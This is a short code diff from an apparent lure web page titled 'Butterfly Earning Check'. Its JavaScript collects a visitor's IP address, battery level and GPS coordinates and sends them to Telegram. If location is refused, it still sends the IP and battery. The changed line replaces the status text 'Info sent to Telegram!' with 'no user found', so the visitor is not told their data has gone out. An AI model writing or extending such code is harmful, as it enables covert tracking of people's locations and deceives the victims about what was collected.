@@ -97,7 +97,7 @@
         const message = `Butterfly Earning Check:\n\nIP: ${ip}\nBattery: ${battery}\n\nLocation:\nLatitude: ${lat}\nLongitude: ${lon}\nMap: ${map}`;
 
         sendToTelegram(message);
-        document.getElementById('status').innerText = "Status: Info sent to Telegram!";
+        document.getElementById('status').innerText = "Status: Info  no user found";
       }, err => {
         sendToTelegram(`IP: ${ip}\nBattery: ${battery}\nLocation: Permission Denied`);
         document.getElementById('status').innerText = "Location denied, but IP and battery sent.";
